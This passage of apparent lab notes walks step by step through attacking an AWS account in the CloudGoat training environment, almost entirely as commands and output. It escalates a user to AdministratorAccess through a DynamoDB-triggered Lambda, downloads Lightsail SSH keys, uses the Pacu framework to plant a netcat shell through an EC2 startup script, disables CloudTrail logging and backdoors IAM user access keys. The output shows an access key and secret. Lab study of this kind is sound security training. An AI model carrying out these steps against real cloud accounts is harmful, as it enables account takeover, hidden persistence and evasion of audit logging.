                "LatestStreamArn": "arn:aws:dynamodb:us-west-2:194713851162:table/escalate_priv/stream/2019-03-21T12:13:25.763"
            }
        }

    # Connect DynamoDB stream to Lambda to invoke the function
    aws lambda create-event-source-mapping --function-name escalate_joe --event-source-arn arn:aws:dynamodb:us-west-2:194713851162:table/escalate_priv/stream/2019-03-21T12:13:25.763 --enabled --starting-position LATEST --profile joe
      # Response
      {
          "UUID": "41e308eb-ef61-4b56-a8f0-299f14415edc",
          "StateTransitionReason": "User action",
          "LastModified": 1553170428.151,
          "BatchSize": 100,
          "EventSourceArn": "arn:aws:dynamodb:us-west-2:194713851162:table/escalate_priv/stream/2019-03-21T12:13:25.763",
          "FunctionArn": "arn:aws:lambda:us-west-2:194713851162:function:escalate_joe",
          "State": "Creating",
          "LastProcessingResult": "No records processed"
      }

    # Wait 2 minutes for the changes to take effect
    # Add a new record to the table to trigger lambda
    aws dynamodb put-item --table-name escalate_priv --item Test='{S=”Joes”}' --profile joe

    # Verify that Joe has been given new permissions
    aws iam list-attached-user-policies --user-name joe --profile joe
      # Joe now has AdministratorAccess and can perform any action
      {
          "AttachedPolicies": [
              {
                  "PolicyName": "DatabaseAdministrator",
                  "PolicyArn": "arn:aws:iam::aws:policy/job-function/DatabaseAdministrator"
              },
              {
                  "PolicyName": "AdministratorAccess",
                  "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
              }
          ]
      }

# Using Lightsail to gain Access
  # Lightsail is a more user friendly equivalent of the EC2 console
  # Simplification comes with perks for us

  # List the instances used in Lightsail, this will also tell you the SSH key used
  aws lightsail get-instances --profile joe

  # Download default keypair used for Lightsail instances
  aws lightsail download-default-key-pair --profile joe

  # Request temporary SSH keys (if unknown) to access an instance
  aws lightsail get-instance-access-details --instance-name cloudgoat_ls --profile joe


# ==================== PART 3 COMPLETE ==================== # # ==================== PART 3 COMPLETE ==================== #

# PACU - AWS Exploitation Framework

  # Setup PACU
  git clone https://github.com/RhinoSecurityLabs/pacu.git
  cd pacu
  virtualenv pacuvenv
  source pacuvenv/bin/activate
  pip3 install -r requirements.txt
  bash install.sh
  python3 pacu.py

  # Install keys for Pacu
  # Provide the obtained access keys, and run command again to add another
  set_keys

  # Switch between users instead of stating profile
  swap_keys

  # List all modules
  ls

  # Enumerate permissions to determine your access level
  run iam__enum_permissions
    # Response
    Running module iam__enum_permissions...
    [iam__enum_permissions] Confirming permissions for users:
    [iam__enum_permissions]   joe...
    [iam__enum_permissions]     Confirmed Permissions for joe
    [iam__enum_permissions] iam__enum_permissions completed.

    [iam__enum_permissions] MODULE SUMMARY:

      Confirmed permissions for user: joe.
      Confirmed permissions for 0 role(s).

  # To find out your current permissions
  whoami

  # To run a similar enumeration for all users do
  run iam__enum_permissions --all-users
    # Response
        4 Users Enumerated
        IAM resources saved in Pacu database.

      [iam__enum_permissions] Permission Document Location:
      [iam__enum_permissions]   sessions/cloudgoat/downloads/confirmed_permissions/

      [iam__enum_permissions] Confirming permissions for users:
      [iam__enum_permissions]   administrator...
      [iam__enum_permissions]     Permissions stored in user-administrator.json
      [iam__enum_permissions]   bob...
      [iam__enum_permissions]     Permissions stored in user-bob.json
      [iam__enum_permissions]   joe...
      [iam__enum_permissions]     Permissions stored in user-joe.json
      [iam__enum_permissions]   training_admin...
      [iam__enum_permissions]     Permissions stored in user-training_admin.json
      [iam__enum_permissions] iam__enum_permissions completed.

      [iam__enum_permissions] MODULE SUMMARY:

        Confirmed permissions for 4 user(s).
        Confirmed permissions for 0 role(s).

  # To run recon on the EC2 services do
  run ec2__enum --regions us-west-2
    # Response
        Running module ec2__enum...
      [ec2__enum] Starting region us-west-2...
      [ec2__enum]   1 instance(s) found.
      [ec2__enum]   4 security groups(s) found.
      [ec2__enum]   0 elastic IP address(es) found.
      [ec2__enum]   0 VPN customer gateway(s) found.
      [ec2__enum]   0 dedicated host(s) found.
      [ec2__enum]   1 network ACL(s) found.
      [ec2__enum]   0 NAT gateway(s) found.
      [ec2__enum]   3 network interface(s) found.
      [ec2__enum]   1 route table(s) found.
      [ec2__enum]   4 subnet(s) found.
      [ec2__enum]   1 VPC(s) found.
      [ec2__enum]   0 VPC endpoint(s) found.
      [ec2__enum]   0 launch template(s) found.
      [ec2__enum] ec2__enum completed.

      [ec2__enum] MODULE SUMMARY:

        Regions:
           us-west-2

          1 total instance(s) found.
          4 total security group(s) found.
          0 total elastic IP address(es) found.
          0 total VPN customer gateway(s) found.
          0 total dedicated hosts(s) found.
          1 total network ACL(s) found.
          0 total NAT gateway(s) found.
          3 total network interface(s) found.
          1 total route table(s) found.
          4 total subnets(s) found.
          1 total VPC(s) found.
          0 total VPC endpoint(s) found.
          0 total launch template(s) found.

  # To manage all the data obtained
  services
    # Select data per service
    data EC2


  # Exploitation

  # To obtain a reverse shell in 1 step instead of 4
    # Setup the file
    vi myreverseshell.sh
      #!/bin/bash
      yum install nmap
      sudo nc -nvlp 1337 -k -e /bin/bash &

    # Run the command when ready
    run ec2__startup_shell_script --script myreverseshell.sh

      # Obtain the new IP and connect again
      aws ec2 describe-instances --profile joe
      nc -nv 34.219.176.192 1337

  # Enumerate monitoring services to stay hidden
  run detection__enum_services
    # Browse the data
    data CloudTrail
      # Output
      Pacu (cloudgoat:joe) > data CloudTrail
      {
        "Trails": [
          {
            "HasCustomEventSelectors": false,
            "HomeRegion": "us-west-2",
            "IncludeGlobalServiceEvents": true,
            "IsMultiRegionTrail": false,
            "LogFileValidationEnabled": true,
            "Name": "cloudgoat_trail",
            "Region": "us-west-2",
            "S3BucketName": "3212625357156459597172710311740308222952246992733311263",
            "S3KeyPrefix": "cloudtrail",
            "TrailARN": "arn:aws:cloudtrail:us-west-2:194713851162:trail/cloudgoat_trail"
          }
        ]
      }

  # Pacu has a module to disable CloudTrail and GuardDuty
  # run detection__disruption --trails cloudgoat_trail@us-west-2 --detectors <idofguardutydetectors>
  run detection__disruption --trails cloudgoat_trail@us-west-2
    # Output
      [detection__disruption]         Successfully disabled trail cloudgoat_trail!

      [detection__disruption] CloudTrail finished.

      [detection__disruption] No rules found. Skipping Config rules...

      [detection__disruption] No recorders found. Skipping Config recorders...

      [detection__disruption] No aggregators found. Skipping Config aggregators...

      [detection__disruption] No alarms found. Skipping CloudWatch...

      [detection__disruption] No flow logs found. Skipping VPC...

      [detection__disruption] detection__disruption completed.

      [detection__disruption] MODULE SUMMARY:

        CloudTrail:
          1 trail(s) disabled.
          0 trail(s) deleted.
          0 trail(s) minimized.

  # Persist access by using a backdoor modules
  # No need to use additional access keys
  run iam__backdoor_users_keys --usernames bob,joe,administrator
    # Output
    # It says that the action failed with Joe and Bob because we created access keys earlier
        Running module iam__backdoor_users_keys...
      [iam__backdoor_users_keys] Backdoor the following users?
      [iam__backdoor_users_keys]   bob
      [iam__backdoor_users_keys]     FAILURE: LimitExceeded
      [iam__backdoor_users_keys]   joe
      [iam__backdoor_users_keys]     FAILURE: LimitExceeded
      [iam__backdoor_users_keys]   administrator
      [iam__backdoor_users_keys]     Access Key ID: AKIAJJ2LEMA2W6GRJ3XQ
      [iam__backdoor_users_keys]     Secret Key: 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
      [iam__backdoor_users_keys] iam__backdoor_users_keys completed.

      [iam__backdoor_users_keys] MODULE SUMMARY:

        1 user key(s) successfully backdoored.
